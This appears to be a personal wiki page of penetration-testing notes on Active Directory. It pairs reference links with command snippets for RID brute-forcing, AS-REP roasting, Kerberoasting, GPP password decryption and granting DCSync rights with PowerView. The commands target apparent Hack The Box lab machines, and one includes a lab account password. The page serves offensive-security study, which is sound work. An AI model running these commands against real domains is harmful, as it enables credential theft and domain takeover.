---
layout: wiki
title: Internals - Active Directory Resources
cate1: Internal
cate2: Active Directory
description: Notes about Active Directory
keywords: Internals
---

# Active Directory Enumeration
 - [Rid Brute via SMB](https://medium.com/@e.escalante.jr/active-directory-workshop-brute-forcing-the-domain-server-using-crackmapexec-pt-6-feab1c43d970)
   - **Requires:** Guest read access to IPC$ (Remote IPC) SMB File Share 
   ```
   nxc smb 10.10.10.192 -u 'guest' -p '' --rid-brute > sid.txt
   cat sid.txt | awk -F': ' '{print $2}' | awk '{print $1}' | sed 's/BLACKFIELD\\//' > users.txt
   GetNPUsers.py BLACKFIELD/ -usersfile users.txt -format hashcat
   ```

# Active Directory Exploitation Strategies
 - [ASREPRoasting via Impacket](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast)
 - **WriteDACL**
   - [WriteDACL - BloodHound](https://support.bloodhoundenterprise.io/hc/en-us/articles/17312765477787-WriteDacl)
 - [Abusing Active Directory ACLs/ACEs](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse)
 - [NTLMRelay](https://www.thehacker.recipes/ad/movement/ntlm/relay)
 - [DCSync - secretsdump](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync)
   - **With PowerView**:
    ```
    whoami /all
    Add-ADGroupMember -Identity "Exchange Windows Permissions" -members svc-alfresco
    net group "Exchange Windows Permissions" /add svc-alfresco
    Add-DomainObjectAcl -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity svc-alfresco -Rights DCSync
    Add-ObjectACL -PrincipalIdentity test123 -Credential $cred -Rights DCSync
    Get-DomainUser -Identity svc-alfresco
    Get-ObjectAcl -DistinguishedName "DC=htb,DC=local" -ResolveGUIDs | Where-Object { $_.IdentityReference -match "svc-alfresco" }
    ```
 - [SYSVOL Group Policy Credential Mining](https://adsecurity.org/?p=2288)
   - ```gppdecrypt```
 - [Kerberoasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast)
   - GetUserSPNs.py -request active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100```
   - Requires an account user with a service principal name (SPN)

## Active Directory Tools
 - [PowerView (Deprecated since 2021)](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)
   -  ```. .\powerview.ps1```
 - [BloodHound CE](https://github.com/SpecterOps/BloodHound)
 - **NSE**
   - ```--script smb-os-discovery,smb-enum-shares,smb-enum-users,smb-vuln*```
 - **SMB**
   - Enum4Linux
   - SMBMap
   - smbclient
   - smbclient.py (Impacket)
   - [NetExec - Cheatsheet](https://github.com/BlWasp/NetExec-Cheatsheet)
   - [SMB Enumeration Cheatsheet](https://0xdf.gitlab.io/2024/03/21/smb-cheat-sheet.html)

## Impacket Tools
  - **PSExec**
    - Shell access via SMB shares (Pass the Hash) 
  - **GetNPUsers**
    - Kerberos Pre-authentication disabled (ASREPRoasting)
 
## Resources
 - [The Hacker Recipes](https://www.thehacker.recipes/)
 - [Active Directory Exploitation Cheat Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)
